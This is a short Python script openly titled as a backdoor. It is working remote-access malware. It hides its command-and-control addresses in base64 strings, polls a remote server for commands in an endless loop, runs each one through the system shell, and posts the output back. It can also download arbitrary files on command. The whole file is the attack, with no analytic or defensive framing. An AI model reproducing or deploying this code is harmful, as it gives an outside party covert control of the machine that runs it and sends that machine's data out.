# Backdoor

import requests, sys, subprocess, base64, urllib.request

def b64():
	filecmd = 'aHR0cDovL2R4eHBueHQuYWx0ZXJ2aXN0YS5vcmcvZHh4cC9maWxlY21k'
	host = 'aHR0cDovL2R4eHBueHQuYWx0ZXJ2aXN0YS5vcmcvZHh4cC9jb250cm9sbGVyLnBocA=='
	pwd = 'dmljdGlt'
	get_command(host, filecmd, pwd)

def download_file(host, pwd, url, filename):
	try:
		urllib.request.urlretrieve(url, filename)
		output = "Download of \033[94m" +filename +"\033[97mFinished: \033[94m" + url
		payload = { 'pwd' : base64.b64decode(pwd).decode('utf-8'), 'cmd' : output}
		requests.post(base64.b64decode(host).decode('utf-8'), data=payload)	
	except:
		output = "\033[91mError while downloading " +filename +": " + url
		payload = { 'pwd' : base64.b64decode(pwd).decode('utf-8'), 'cmd' : output}
		requests.post(base64.b64decode(host).decode('utf-8'), data=payload)

def get_command(host, filecmd, pwd):
	while True:
		command = requests.get(base64.b64decode(filecmd).decode('utf-8')).text
		if not command == ':exit':
			if command[:9] == ':download':
				commad, url, filename = command.split(" ")
				download_file(host, pwd, url, filename)
			else:
				cmd = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr = subprocess.PIPE)
				cmd = cmd.stdout + cmd.stderr
				payload = { 'pwd' : base64.b64decode(pwd).decode('utf-8'), 'cmd' : cmd}
				requests.post(base64.b64decode(host).decode('utf-8'), data=payload)
		else:
			sys.exit()

if __name__ in "__main__":
	b64()
